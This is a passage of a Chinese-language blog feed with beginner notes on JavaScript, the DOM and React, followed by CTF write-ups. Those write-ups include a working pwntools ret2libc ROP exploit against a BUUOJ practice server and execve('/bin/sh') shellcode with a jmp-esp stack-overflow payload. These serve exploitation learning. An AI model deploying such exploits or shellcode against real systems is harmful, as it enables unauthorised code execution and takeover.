autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">```<br>/runoob/是正则表达式主题，用于检索<br>i是修饰符，表示不分大小写<br></code></pre></td></tr></table></figure><p>正则表达式常用于检索和替换中</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">var str <span class="hljs-operator">=</span> document.getElementById(<span class="hljs-string">&quot;DEmo&quot;</span>).innerHTML<span class="hljs-comment">;</span><br>var n <span class="hljs-operator">=</span> str.search(<span class="hljs-string">&quot;Runoob&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>replace:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">var</span> str = document.getElementById(<span class="hljs-string">&quot;demo&quot;</span>).innerHTML;<br><span class="hljs-keyword">var</span> txt = str.<span class="hljs-built_in">replace</span>(<span class="hljs-regexp">/microsoft/i</span>,<span class="hljs-string">&quot;Runoob&quot;</span>);<br>修改了txt内容，str未变<br><br></code></pre></td></tr></table></figure><h3 id="JS表单验证"><a href="#JS表单验证" class="headerlink" title="JS表单验证"></a>JS表单验证</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">validateForm</span>(<span class="hljs-params"></span>)</span><br><span class="language-javascript">&#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> x=<span class="hljs-variable language_">document</span>.<span class="hljs-property">forms</span>[<span class="hljs-string">&quot;myForm&quot;</span>][<span class="hljs-string">&quot;fname&quot;</span>].<span class="hljs-property">value</span>;</span><br><span class="language-javascript">    <span class="hljs-keyword">if</span>(x == <span class="hljs-literal">null</span>||x == <span class="hljs-string">&quot;&quot;</span>)</span><br><span class="language-javascript">    &#123;</span><br><span class="language-javascript">        <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;姓必须填写&quot;</span>);</span><br><span class="language-javascript">        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;myForm&quot;</span> <span class="hljs-attr">action</span> = <span class="hljs-string">&quot;demo.php&quot;</span> <span class="hljs-attr">onsubmit</span>=<span class="hljs-string">&quot;return validateForm()&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>姓:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span> = <span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span> = <span class="hljs-string">&quot;fname&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span> = <span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span> = <span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="JS的this"><a href="#JS的this" class="headerlink" title="JS的this"></a>JS的this</h3><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">在方法中，<span class="hljs-keyword">this</span>表示该方法所属的对象<br>fullName : function()&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.firstname + <span class="hljs-string">&quot; &quot;</span> + <span class="hljs-keyword">this</span>.lastname;<br>&#125;<br>单独使用，<span class="hljs-keyword">this</span>是全局对象<br>事件中的<span class="hljs-keyword">this</span><br>在HTML事件句柄中，<span class="hljs-keyword">this</span>指向了接收事件的HTML元素<br>&lt;button onclick=<span class="hljs-string">&quot;this.style.display =&#x27;none&#x27;&quot;</span>&gt;<br>点我后就消失咯<br>&lt;/button&gt;<br></code></pre></td></tr></table></figure><h2 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h2><p>DOM(Document Object Model)<strong>文档对象模型</strong></p><h3 id="DOM节点"><a href="#DOM节点" class="headerlink" title="DOM节点"></a>DOM节点</h3><p>DOM节点树<br><img src="/2022/06/30/front/pe.png"><br>节点之间拥有层级关系<br>常用<strong>父</strong>，<strong>子</strong>，<strong>同胞</strong>等术语描述这些关系</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>DOM 教程<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>DOM 课程1<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Hello world!<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>此代码中<br>文本结点”hello world!”的父节点是<code>&lt;p&gt;</code>节点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs <h1>```与```<p>```节点是同胞结点">### DOM方法<br>HTML DOM方法是我们可以在节点（即HTML元素）上执行的动作<br>HTML DOM属性是我们可以在节点设置和修改的值<br>#### 编程接口<br>**getElementById()方法**<br></code></pre></td></tr></table></figure><p>var elemnt = document.getElementById(“intro”);</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">以及一些常用的方法<br></code></pre></td></tr></table></figure><p>appendChild(node)插入新的子节点<br>removeChild(node)删除字节点</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs clean">### DOM属性<br>**innerHTML属性**<br>获取元素内容的最简单的方法是使用innerHTML属性<br>innerHTML属性对于获取和替换HTML元素的内容很有用<br>注意**inner**<br>**nodeValue属性**<br>nodeValue属性规定节点的值<br>元素节点的nodeValue是undefined或null<br>文本节点的nodeValue是文本本身<br>属性节点的nodeValue是属性值<br>### DOM访问<br>访问HTML元素（节点）<br>**getElementById()方法**<br></code></pre></td></tr></table></figure><p>document.getElementById(“id”);</p><p id="intro">helloworld</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">id相对于，以起到寻找的作用<br>**<span class="hljs-built_in">getElementsByTagName</span>()方法**<br>该方法会选取所有该标签的<span class="hljs-selector-tag">HTML</span>元素<br></code></pre></td></tr></table></figure>document.getElementByTagName("p")<p>hello</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs clean">**getElementsByClassName()方法**<br>### DOM修改<br>**修改HTML内容**<br></code></pre></td></tr></table></figure><script>document.getElementById("intro").innerHTML = "new words";</script><p id="intro"></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**修改HTML样式**</span><br></code></pre></td></tr></table></figure><p id="p1">Hello</p><p id="p2">hello</p><script>document.getElementById("p2").style.color = "red";document.getElementById("p2").style.fontFamily = "Arial";document.getElementById("p2").style.fontSize = "700";</script><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**添加新的HTML元素**</span><br></code></pre></td></tr></table></figure><div id="div1"><p id="p1">p1</p><p id="p2">p2</p></div><script>var para = document.createElement("p");var node = document.createTextNode("new para");para.appendChild(node);var element = document.getElementById("div1");element.appendChild(para);</script><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss">### DOM元素<br>**创建新的<span class="hljs-selector-tag">HTML</span>元素<span class="hljs-built_in">-createElement</span>()**<br>如上方代码一样<br>先创建，再添加到已有的元素上<br>**<span class="hljs-built_in">insertBefore</span>()方法**<br>可以在指定元素节点之前添加该元素<br></code></pre></td></tr></table></figure>insertBefore(src,des)<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">注意记得为各个节点命名，方便操作<br>**<span class="hljs-built_in">replaceChild</span>()方法**<br>替换目标元素<br></code></pre></td></tr></table></figure>replaceBefore(src,des);<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>## React<br>### React部署<br>利用官方cdn链接<br></code></pre></td></tr></table></figure><script src="cdnurl"></script><script src="https://cdn.staticfile.org/react/16.4.0/umd/react.development.js"></script><script src="https://cdn.staticfile.org/react-dom/16.4.0/umd/react-dom.development.js"></script><script src="https://cdn.staticfile.org/babel-standalone/6.26.0/babel.min.js"></script><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mel"><br>实例中我们引入了三个库： react.development.<span class="hljs-keyword">min</span>.js 、react-dom.development.<span class="hljs-keyword">min</span>.js 和 babel.<span class="hljs-keyword">min</span>.js：<br>**react.<span class="hljs-keyword">min</span>.js**是核心库<br>**react-dom.<span class="hljs-keyword">min</span>.js**提供与DOM相关的功能<br>**babel.<span class="hljs-keyword">min</span>.js**Babel可以将ES6代码转为ES5，提高兼容性<br>### React元素渲染<br>#### 将元素渲染到DOM中<br>传递给<span class="hljs-string">``</span><span class="hljs-string">`ReactDOM.render()`</span><span class="hljs-string">``</span><br></code></pre></td></tr></table></figure>const element = <h1>HEllo</h1>ReactDOM.render(    element,    document.getElementById('example'));即可将element内容传给example为id的元素<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">#### 更新元素渲染<br>因为React元素是不可变的，修改时，需要用新元素进行替换<br></code></pre></td></tr></table></figure>function tick(){    const element = (        <div>            <h1>现在是{new Date().toLocateTimeString()}.</h1>        </div>     );     ReactDOM.render(         element,         document.getElementById('example')         );}<p>setInterval(tick,1000);</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean">每<span class="hljs-number">1000</span>ms替换一次，达到计时效果<br>### React JSX<br>JSX是一种语法<br>在react中代替常规的JavaScript<br>如<br></code></pre></td></tr></table></figure><p>const element = </p><h1>HEllo</h1>;<p></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">**注意**<br>由于JSX是Javascript语言，故一些标识符如<span class="hljs-keyword">class</span>最好用<span class="hljs-symbol">className</span>代替<br></code></pre></td></tr></table></figure><p>var myDivElement = <div classname="foo">;</div></p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">#### 在JSX中插入JS表达式<br></code></pre></td></tr></table></figure><p>ReactDOM.render(<br>    <div><br>        <h1>{i == 1 ? ‘True!’ : “False!”}</h1><br>    </div><br>    ,<br>    document.getElementById(‘example’)<br>);<br>就是JS套HTML再套JS的感觉</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">### React组件<br></code></pre></td></tr></table></figure><p>function HellowMessage(props){<br>    return </p><h1>HElloe world</h1>;<br>}<p></p><p>const element = <HelloMessage>;</HelloMessage></p><p>ReactDOM.render(<br>    element<br>    ,<br>    document.getElementById(‘example’)<br>    );</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><br><span class="hljs-strong">**第一步**</span><br>使用函数定义一个组件<br><br><span class="hljs-strong">**第二步**</span><br>用一个元素调用这个组件<br></code></pre></td></tr></table></figure><p>const element = <HelloMessage></HelloMessage></p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">最后调用这个元素即可<br>#### 复合组件<br></code></pre></td></tr></table></figure><p>function Name(props) {<br>    return </p><h1>网站名称：{props.name}</h1>;<br>}<br>function Url(props) {<br>    return <h1>网站地址：{props.url}</h1>;<br>}<br>function Nickname(props) {<br>    return <h1>网站小名：{props.nickname}</h1>;<br>}<br>function App() {<br>    return (<br>    <div><br>        <Name name="菜鸟教程"><br>        <Url url="http://www.runoob.com"><br>        <Nickname nickname="Runoob"><br>    </Nickname></Url></Name></div><br>    );<br>}<p></p><p>ReactDOM.render(<br>     <App>,<br>    document.getElementById(‘example’)<br>);</App></p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs clean">可以看出，用props.name时，传递参数要写，name =  <span class="hljs-string">&quot;...&quot;</span><br>### React State（状态）<br>#### 将生命周期方法添加到类中<br>如<br>每当Clock组件第一次加载到 DOM 中的时候，我们都想生成定时器，这在 React 中被称为挂载。<br><br>同样，每当 Clock 生成的这个 DOM 被移除的时候，我们也会想要清除定时器，这在 React 中被称为卸载。<br></code></pre></td></tr></table></figure><p>class Clock extends React.Component {<br>  constructor(props) {<br>    super(props);<br>    this.state = {date: new Date()};<br>  }</p><p>  componentDidMount() {<br>    this.timerID = setInterval(<br>      () =&gt; this.tick(),<br>      1000<br>    );<br>  }</p><p>  componentWillUnmount() {<br>    clearInterval(this.timerID);<br>  }</p><p>  tick() {<br>    this.setState({<br>      date: new Date()<br>    });<br>  }</p><p>  render() {<br>    return (<br>      <div><br>        <h1>Hello, world!</h1><br>        <h2>现在是 {this.state.date.toLocaleTimeString()}.</h2><br>      </div><br>    );<br>  }<br>}</p><p>ReactDOM.render(<br>  <Clock>,<br>  document.getElementById(‘example’)<br>);</Clock></p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs pf">componentDidMount() 与 componentWillUnmount() 方法被称作生命周期钩子。<br><br>在组件输出到 DOM 后会执行 componentDidMount() 钩子，我们就可以在这个钩子上设置一个定时器。<br><br>this.timerID 为定时器的 ID，我们可以在 componentWillUnmount() 钩子中卸载定时器。代码执行顺序：<br><br>当 <span class="hljs-variable">&lt;Clock /&gt;</span> 被传递给 ReactDOM.render() 时，React 调用 Clock 组件的构造函数。 由于 Clock 需要显示当前时间，所以使用包含当前时间的对象来初始化 this.<span class="hljs-keyword">state</span> 。 我们稍后会更新此状态。<br><br>React 然后调用 Clock 组件的 render() 方法。这是 React 了解屏幕上应该显示什么内容，然后 React 更新 DOM 以匹配 Clock 的渲染输出。<br><br>当 Clock 的输出插入到 DOM 中时，React 调用 componentDidMount() 生命周期钩子。 在其中，Clock 组件要求浏览器设置一个定时器，每秒钟调用一次 tick()。<br><br>浏览器每秒钟调用 tick() 方法。 在其中，Clock 组件通过使用包含当前时间的对象调用 <span class="hljs-built_in">set</span>State() 来调度UI更新。 通过调用 <span class="hljs-built_in">set</span>State() ，React 知道状态已经改变，并再次调用 render() 方法来确定屏幕上应当显示什么。 这一次，render() 方法中的 this.<span class="hljs-keyword">state</span>.date 将不同，所以渲染输出将包含更新的时间，并相应地更新 DOM。<br><br>一旦 Clock 组件被从 DOM 中移除，React 会调用 componentWillUnmount() 这个钩子函数，定时器也就会被清除。<br><span class="hljs-comment">### React Props</span><br>props用于传递数据<br></code></pre></td></tr></table></figure><p>function HelloMe(props){<br>    return </p><h1>Hello {props.name}!</h1><br>}<p></p><p>const element= <HelloMe name="kasw">;</HelloMe></p><p>ReactDOM.render(<br>    element,<br>    document.getElementById(‘example’)<br>);</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">### React 事件处理<br>HTML事件处理：<br></code></pre></td></tr></table></figure><button onclick="activateLasers()">激活按钮</button><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">React:</span><br></code></pre></td></tr></table></figure><button onclick="{activateLasers}">激活按钮</button><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean">react中使用驼峰写法，且传入的是函数，而不是字符串<br>### React 条件渲染<br>登录界面判断<br>是输出**欢迎回来**<br>还是**请先注册**<br></code></pre></td></tr></table></figure>function UserGreeting(props) {  return <h1>欢迎回来!</h1>;}<p>function GuestGreeting(props) {<br>  return </p><h1>请先注册。</h1>;<br>}<br>function Greeting(props) {<br>  const isLoggedIn = props.isLoggedIn;<br>  if (isLoggedIn) {<br>    return <UserGreeting>;<br>  }<br>  return <GuestGreeting>;<br>}<p></p><p>ReactDOM.render(<br>  // 尝试修改 isLoggedIn={true}:<br>  <Greeting isloggedin="{false}">,<br>  document.getElementById(‘example’)<br>);<br>```</Greeting></p></GuestGreeting></UserGreeting></some-HTML-element>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>泄露出来的地址的处理</title>
    <link href="/2022/05/30/%E6%B3%84%E9%9C%B2%E5%87%BA%E6%9D%A5%E7%9A%84%E5%9C%B0%E5%9D%80%E7%9A%84%E5%A4%84%E7%90%86/"/>
    <url>/2022/05/30/%E6%B3%84%E9%9C%B2%E5%87%BA%E6%9D%A5%E7%9A%84%E5%9C%B0%E5%9D%80%E7%9A%84%E5%A4%84%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="一道简单的ROP题"><a href="#一道简单的ROP题" class="headerlink" title="一道简单的ROP题"></a>一道简单的ROP题</h1><h2 id="但是不是那么简单"><a href="#但是不是那么简单" class="headerlink" title="但是不是那么简单"></a>但是不是那么简单</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><pre><code class="hljs python3">from pwn import*<br>from LibcSearcher import*<br>p = remote(&#x27;node4.buuoj.cn&#x27;,28006)<br>#p = process(&#x27;./rop&#x27;)<br>elf = ELF(&#x27;./rop&#x27;)<br>put_plt_addr = elf.plt[&#x27;puts&#x27;]<br>put_got_addr = elf.got[&#x27;puts&#x27;]<br>vuln = 0x4006ad<br>pop_rdi = 0x400733<br><br><br>payload1 = b&#x27;A&#x27;*40 + p64(pop_rdi) + p64(put_got_addr) + p64(put_plt_addr) + p64(vuln)<br><br>p.recvuntil(&#x27;story!\n&#x27;)<br>p.sendline(payload1)<br><br>put_got = u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))<br>print(hex(put_got))<br>libc = LibcSearcher(&#x27;puts&#x27;,put_got)<br>libc_base = put_got - libc.dump(&#x27;puts&#x27;)<br>sys = libc_base + libc.dump(&#x27;system&#x27;)<br>binsh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)<br><br><br>payload2 = b&#x27;A&#x27;*40 + p64(pop_rdi) + p64(binsh) + p64(sys)<br>p.recv()<br>p.sendline(payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>接收返回的got地址时，使用</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.recv</span>(<span class="hljs-number">6</span>)<span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>,&#x27;\x00&#x27;)<br># or<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.recvline</span>()<span class="hljs-selector-class">.strip</span>()<span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>,&#x27;\x00&#x27;)<br></code></pre></td></tr></table></figure><p>是正确的<br>这样可以正确地补上两位\x00<br>而其他方法，保留\n的都是错误的，会导致地址错误！</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>shellcode</title>
    <link href="/2022/05/28/shellcode/"/>
    <url>/2022/05/28/shellcode/</url>
    
    <content type="html"><![CDATA[<h1 id="shellcode的利用"><a href="#shellcode的利用" class="headerlink" title="shellcode的利用"></a>shellcode的利用</h1><p>以国赛提前一天放出的模拟题为例<br>本文基于32位系统<br>打开题目后可以发现一下基础信息</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><pre><code class="hljs mipsasm">没有开任何防护<br>没有开NX保护，意味着第一时间可以想到，把<span class="hljs-keyword">shellcode放在栈上运行</span><br><span class="hljs-keyword"></span>是<span class="hljs-number">32</span>位程序<br></code></pre></td></tr></table></figure><h2 id="shellcode-生成方法"><a href="#shellcode-生成方法" class="headerlink" title="shellcode 生成方法"></a>shellcode 生成方法</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">context</span><span class="hljs-params">(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, arch = <span class="hljs-string">&#x27;i386&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>)</span></span><br>shellcode = <span class="hljs-built_in">asm</span>(shellcraft<span class="hljs-selector-class">.sh</span>())<br></code></pre></td></tr></table></figure><p>这样就可以生成一个shellcode<br><strong>注意：这样生成的shellcode长度为44，如果超过可以收容的大小，可能需要用其他方法编写shellcode</strong><br>以下为手动生成shellcode方法，大小为23，很小。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">shellcode =<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">eax</span>             #<span class="hljs-built_in">eax</span>置<span class="hljs-number">0</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">edx</span>#<span class="hljs-built_in">edx</span>置<span class="hljs-number">0</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span>#将<span class="hljs-number">0</span>入栈，标记了”/bin/sh”的结尾<br><span class="hljs-keyword">push</span> <span class="hljs-number">0x68732f2f</span>         #传递”/sh”，为了<span class="hljs-number">4</span>字节对齐，使用//sh，这在execve()中等同于/sh<br><span class="hljs-keyword">push</span> <span class="hljs-number">0x6e69622f</span>         #传递“/bin”<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebx</span>,<span class="hljs-built_in">esp</span>             #此时<span class="hljs-built_in">esp</span>指向了”/bin/sh”,通过<span class="hljs-built_in">esp</span>将该字符串的值传递给<span class="hljs-built_in">ebx</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">ecx</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">0xB</span>              #<span class="hljs-built_in">eax</span>置为execve函数的中断号<br><span class="hljs-keyword">int</span> <span class="hljs-number">0x80</span>                #调用软中断<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode=asm（shellcode）<br></code></pre></td></tr></table></figure><p>关于int 0x80软中断</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">第一步，就是需要将系统调用号加入到<span class="hljs-built_in">eax</span>中。<br>第二步，<span class="hljs-built_in">ebx</span>保存函数调用的第一个参数，<span class="hljs-built_in">ecx</span>、<span class="hljs-built_in">edx</span>、<span class="hljs-built_in">esi</span>、<span class="hljs-built_in">edi</span>分别对应这<span class="hljs-number">2345</span>个参数。<br>如果参数超过<span class="hljs-number">5</span>个，就必须将参数数组存储在内存中，而且必须将该数组的地址放在<span class="hljs-built_in">ebx</span>中。<br>一旦加载寄存器后，就会调用<span class="hljs-keyword">int</span> <span class="hljs-number">0x80</span> 汇编指令来中断，强迫内核暂停手头上的工作并处理该中断。<br></code></pre></td></tr></table></figure><h2 id="用ROPgadget获取jmp-esp地址"><a href="#用ROPgadget获取jmp-esp地址" class="headerlink" title="用ROPgadget获取jmp esp地址"></a>用ROPgadget获取jmp esp地址</h2><p>目的在于将返回值设置为jmp esp，可以返回esp然后执行传入的shellcode。</p><h2 id="最终的payload"><a href="#最终的payload" class="headerlink" title="最终的payload"></a>最终的payload</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">payload = shellcode.ljust(<span class="hljs-number">0x80</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>) + p32(addr_jmp_esp) + asm(<span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">esp</span>,<span class="hljs-title">offset</span></span>;call esp)<br><span class="hljs-comment">#关于这个asm(...),是手动启用栈，offset值为前面覆盖的数据长度+4。</span><br></code></pre></td></tr></table></figure><p>如此就可以利用一个没有保护，但是也没有system()的程序。<br><strong>注意shellcode在发送时不用p32包装！！</strong></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>国赛</title>
    <link href="/2022/05/23/%E5%9B%BD%E8%B5%9B/"/>
    <url>/2022/05/23/%E5%9B%BD%E8%B5%9B/</url>
